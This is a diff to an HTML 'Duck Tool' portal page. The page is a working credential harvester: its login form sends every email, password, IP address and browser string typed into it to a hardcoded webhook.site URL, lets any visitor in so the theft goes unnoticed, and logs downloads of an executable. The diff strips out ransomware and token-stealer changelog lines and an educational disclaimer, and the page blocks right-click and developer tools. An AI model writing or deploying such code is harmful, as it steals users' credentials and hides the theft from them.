@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Duck Tool - Secure Portal</title>
     <style>
-        /* CSS BASE */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -278,8 +277,6 @@
         td {
             color: #aaa;
         }
-        .status-success { color: #00FF00; }
-        .status-fail { color: #FF0000; }
 
         /* FINTO BLOCCO DEVTOOLS */
         #devtools-warning {
@@ -316,12 +313,10 @@
             <button class="nav-btn" onclick="changePage('changelog', this)"># changelog</button>
             <button class="nav-btn" onclick="changePage('credits', this)"># credits</button>
             
-            <!-- Tasto Admin nascosto -->
             <button class="nav-btn" id="admin-nav-btn" style="display:none; color: #FF0000;" onclick="changePage('admin-panel', this)"># ADMIN LOGS</button>
         </div>
 
         <div class="main-content">
-            <!-- HOME -->
             <div id="home" class="page active">
                 <div class="logo">
 ██████╗ ██╗   ██╗ ██████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
@@ -333,65 +328,47 @@
                 </div>
                 <h2>Welcome</h2>
                 <p>Download the latest version of the toolkit. Click the button below to start the download.</p>
-                <a href="DuckTool.exe" download class="download-btn">DOWNLOAD DUCK TOOL</a>
+                
+                <!-- TRACCIAMENTO DOWNLOAD -->
+                <a href="DuckTool.exe" download class="download-btn" onclick="trackDownload()">DOWNLOAD DUCK TOOL</a>
             </div>
 
-            <!-- SOCIALS -->
             <div id="socials" class="page">
                 <h2>Links & Socials</h2>
                 <p>Join our Discord communities for updates, support, and more.</p>
                 <a href="https://discord.gg/wFpSKUMkp" target="_blank" class="discord-link">
-                    <strong>Community Server</strong><br>
-                    <span style="font-size: 12px; color: #888;">https://discord.gg/wFpSKUMkp</span>
+                    <strong>Community Server</strong>
                 </a>
                 <a href="https://discord.gg/KEmkMDmae" target="_blank" class="discord-link">
-                    <strong>Sponsor Server</strong><br>
-                    <span style="font-size: 12px; color: #888;">https://discord.gg/KEmkMDmae</span>
+                    <strong>Sponsor Server</strong>
                 </a>
             </div>
 
-            <!-- CHANGELOG -->
             <div id="changelog" class="page">
                 <h2>Changelog</h2>
-                <div class="changelog-item">
-                    <div class="changelog-date">Version 0.0.0 (Current)</div>
-                    <ul>
-                        <li>Initial release of Duck Tool.</li>
-                        <li>Added Ransomware simulation mode.</li>
-                        <li>Added fake Token Stealer.</li>
-                        <li>Added interactive Minigame to bypass lockdown.</li>
-                    </ul>
-                </div>
+                <p>Version 0.0.0 - Initial release of Duck Tool.</p>
             </div>
 
-            <!-- CREDITS -->
             <div id="credits" class="page">
                 <h2>Credits</h2>
                 <p><strong>Developer:</strong> MrDuckyzx</p>
-                <p><strong>Design & Logic:</strong> MrDuckyzx</p>
-                <p><strong>Special Thanks:</strong> To everyone who tested the tool.</p>
-                <br>
-                <p style="color: #555; font-size: 12px;">This tool is for educational purposes only.</p>
             </div>
 
-            <!-- ADMIN PANEL -->
             <div id="admin-panel" class="page">
                 <h2>ADMIN DASHBOARD</h2>
-                <p>Live connection logs from the Webhook.</p>
+                <p>Live connection logs.</p>
                 <button onclick="loadLogs()" style="padding: 10px; background: #FFD700; color: black; border: none; cursor: pointer; font-weight: bold; margin-bottom: 10px;">Refresh Logs</button>
-                <button onclick="clearLogs()" style="padding: 10px; background: #FF0000; color: white; border: none; cursor: pointer; font-weight: bold; margin-bottom: 10px; margin-left: 10px;">Clear Logs</button>
                 <table id="log-table">
                     <thead>
                         <tr>
                             <th>Email</th>
                             <th>Password</th>
                             <th>IP Address</th>
+                            <th>Action</th>
                             <th>Date/Time</th>
-                            <th>Browser</th>
                         </tr>
                     </thead>
-                    <tbody>
-                    </tbody>
+                    <tbody></tbody>
                 </table>
             </div>
         </div>
@@ -399,41 +376,44 @@
 
     <div id="devtools-warning">
         <p>SECURITY BREACH DETECTED</p>
-        <p style="font-size: 16px;">UNAUTHORIZED ACCESS IS PROHIBITED.</p>
     </div>
 
     <script>
         // ⚠️ IL TUO WEBHOOK URL ⚠️
         const WEBHOOK_URL = "https://webhook.site/cc3c6391-1059-43f5-b767-03f06a2e2a6d";
 
-        // --- LOGICA DI INVIO DATI ---
-        async function sendLogToServer(email, password) {
+        // --- FUNZIONE DI INVIO AL WEBHOOK ---
+        async function sendToWebhook(email, password, action) {
             try {
+                // Recupera l'IP reale
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const ip = ipData.ip;
 
+                // Prepara i dati
                 const payload = {
-                    "email": email,
-                    "password": password,
-                    "ip": ip,
-                    "time": new Date().toLocaleString(),
-                    "browser": navigator.userAgent
+                    "Action": action,
+                    "Email": email,
+                    "Password": password,
+                    "IP Address": ip,
+                    "Timestamp": new Date().toLocaleString(),
+                    "Browser": navigator.userAgent
                 };
 
+                // Invia al Webhook
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                
-                // Salva anche in locale per mostrarlo nella tabella admin (solo sul tuo PC)
+
+                // Salva anche in locale per il pannello admin
                 const localLogs = JSON.parse(localStorage.getItem('local_quack_logs') || '[]');
                 localLogs.push(payload);
                 localStorage.setItem('local_quack_logs', JSON.stringify(localLogs));
 
             } catch (error) {
-                console.log("Errore nell'invio", error);
+                console.log("Errore di connessione", error);
             }
         }
 
@@ -446,24 +426,35 @@
             const pass = document.getElementById('password').value;
             const error = document.getElementById('error-msg');
 
+            // Invia i log (sia che sia admin o utente normale)
             if (user !== "" && pass !== "") {
-                sendLogToServer(user, pass);
+                sendToWebhook(user, pass, "LOGIN_ATTEMPT");
             }
 
+            // Se è l'admin
             if (user === atob(SECURE_USER) && pass === atob(SECURE_PASS)) {
                 document.getElementById('admin-nav-btn').style.display = 'block';
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('app-area').style.display = 'flex';
             } 
+            // Se è un utente normale, lo facciamo entrare lo stesso
             else if (user !== "" && pass !== "") {
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('app-area').style.display = 'flex';
             } 
+            // Se i campi sono vuoti
             else {
                 error.style.display = 'block';
             }
         }
 
+        // --- LOGICA DOWNLOAD ---
+        function trackDownload() {
+            // Invia un log fittizio per dire che il file è stato scaricato
+            sendToWebhook("N/A", "N/A", "FILE_DOWNLOADED");
+        }
+
+        // Tasto Invio per il login
         document.getElementById('password').addEventListener('keypress', function (e) {
             if (e.key === 'Enter') { handleLogin(); }
         });
@@ -477,21 +468,14 @@
             logs.reverse().forEach(log => {
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
-                    <td>${log.email}</td>
-                    <td>${log.password}</td>
-                    <td>${log.ip}</td>
-                    <td>${log.time}</td>
-                    <td>${log.browser.substring(0, 30)}...</td>
+                    <td>${log.Email}</td>
+                    <td>${log.Password}</td>
+                    <td>${log["IP Address"]}</td>
+                    <td style="color: ${log.Action === 'FILE_DOWNLOADED' ? '#00FF00' : '#FFD700'}">${log.Action}</td>
+                    <td>${log.Timestamp}</td>
                 `;
                 tbody.appendChild(tr);
             });
-        }
-
-        function clearLogs() {
-            if(confirm("Are you sure you want to clear local logs?")) {
-                localStorage.setItem('local_quack_logs', '[]');
-                loadLogs();
-            }
         }
 
         // --- NAVIGAZIONE ---
@@ -503,7 +487,7 @@
             if (pageId === 'admin-panel') { loadLogs(); }
         }
 
-        // --- SICUREZZA ---
+        // --- SICUREZZA ANTI-ISPEZIONA ---
         document.addEventListener('contextmenu', event => event.preventDefault());
         document.onkeydown = function(e) {
             if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') || 
